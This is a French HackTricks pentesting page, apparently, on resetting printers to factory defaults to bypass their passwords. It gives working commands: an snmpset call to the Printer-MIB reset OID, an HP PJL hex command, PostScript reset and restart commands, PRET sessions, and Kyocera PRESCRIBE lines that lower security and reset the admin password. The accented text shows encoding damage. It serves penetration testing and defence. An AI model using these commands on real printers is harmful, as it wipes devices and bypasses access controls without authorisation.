<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**RÃ©initialiser** un appareil aux paramÃ¨tres d'usine est une fonctionnalitÃ© critique en matiÃ¨re de sÃ©curitÃ© car elle **Ã©crase les mÃ©canismes de protection** tels que les mots de passe dÃ©finis par l'utilisateur. Cela peut gÃ©nÃ©ralement Ãªtre fait en appuyant sur une **combinaison de touches spÃ©ciale** sur le **panneau de commande** de l'imprimante. Effectuer une telle rÃ©initialisation ne prend que quelques secondes et est donc un scÃ©nario rÃ©aliste pour les attaquants locaux ou les testeurs de pÃ©nÃ©tration, qui peuvent par exemple se faufiler dans la salle de copie Ã  l'heure du dÃ©jeuner. Cependant, l'**accÃ¨s physique** Ã  l'appareil n'est **pas toujours une option**.

### SNMP

Le Printer-MIB dÃ©finit l'objet **prtGeneralReset** (**OID 1.3.6.1.2.1.43.5.1.1.3.1**) qui permet Ã  un attaquant de redÃ©marrer l'appareil (powerCycleReset(4)), de rÃ©initialiser les paramÃ¨tres NVRAM (resetToNVRAM(5)) ou de restaurer les paramÃ¨tres d'usine (resetToFactoryDefaults(6)) en utilisant SNMP. Cette fonctionnalitÃ©/attaque est **prise en charge par une grande variÃ©tÃ© d'imprimantes** et supprime tous les mÃ©canismes de protection tels que les mots de passe dÃ©finis par l'utilisateur pour le serveur web intÃ©grÃ©. Bien que les mÃ©canismes de protection puissent Ãªtre contournÃ©s efficacement, un inconvÃ©nient pratique de cette approche est que toute la **configuration d'adresse IP statique sera perdue**. **Si aucun service DHCP** n'est disponible, l'attaquant ne pourra **plus** se **reconnecter** Ã  l'appareil aprÃ¨s l'avoir rÃ©initialisÃ© aux paramÃ¨tres d'usine.

**RÃ©initialiser l'appareil aux paramÃ¨tres d'usine** peut Ãªtre accompli en utilisant la commande `snmpset` comme indiquÃ© ci-dessous (vous devez connaÃ®tre la **chaÃ®ne de communautÃ©**, qui est par dÃ©faut dans la plupart des cas `public`):
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

Dans de nombreux scÃ©narios, un attaquant n'a pas la capacitÃ© d'effectuer des requÃªtes SNMP en raison de pare-feux ou de chaÃ®nes de communautÃ© SNMP inconnues. Cependant, sur les appareils **HP**, **SNMP** peut Ãªtre transformÃ© en sa reprÃ©sentation **PML** et intÃ©grÃ© Ã  une tÃ¢che d'impression lÃ©gitime. Cela permet Ã  un attaquant de **redÃ©marrer et/ou de rÃ©initialiser l'appareil** aux paramÃ¨tres d'usine dans des tÃ¢ches d'impression ordinaires, comme indiquÃ© ci-dessous:
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
N'importe qui peut reproduire cette attaque sur les imprimantes HP, redÃ©marrer ou rÃ©initialiser l'appareil peut facilement Ãªtre reproduit en utilisant [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScript offre une fonctionnalitÃ© similaire : le paramÃ¨tre systÃ¨me **FactoryDefaults**, "un indicateur qui, s'il est **dÃ©fini sur vrai** **juste avant** que l'imprimante soit Ã©teinte, provoque le retour de tous les paramÃ¨tres non volatils Ã  leurs valeurs **par dÃ©faut d'usine** lors de la prochaine mise sous tension". Il convient de noter que **PostScript** lui-mÃªme a Ã©galement la capacitÃ© de **redÃ©marrer** son **environnement**, mais cela nÃ©cessite un **mot de passe valide**. \
Cependant, l'interprÃ©teur PostScript peut Ãªtre mis dans une **boucle infinie** comme discutÃ© dans les attaques DoS de [traitement de document](http://hacking-printers.net/wiki/index.php/Document_processing), ce qui oblige l'utilisateur Ã  **redÃ©marrer manuellement** l'appareil et donc Ã  rÃ©initialiser le mot de passe PostScript.

RÃ©initialiser les paramÃ¨tres systÃ¨me PostScript aux valeurs par dÃ©faut d'usine :
```bash
<< /FactoryDefaults true >> setsystemparams
```
RedÃ©marrer l'interprÃ©teur PostScript et la mÃ©moire virtuelle :
```bash
true 0 startjob systemdict /quit get exec
```
N'importe qui peut redÃ©marrer ou rÃ©initialiser l'interprÃ©teur PostScript d'une imprimante peut Ãªtre facilement reproduit en utilisant [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

Pour les appareils **Kyocera**, les langages de description de page **PRESCRIBE** peuvent Ãªtre utilisÃ©s pour **rÃ©initialiser l'appareil** aux paramÃ¨tres d'usine Ã  partir de travaux d'impression ordinaires en utilisant l'une des commandes suivantes :
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
Pour reproduire cette attaque, ouvrez une connexion rÃ©seau brute sur le port 9100/tcp de l'imprimante et **envoyez les commandes documentÃ©es ci-dessus**.
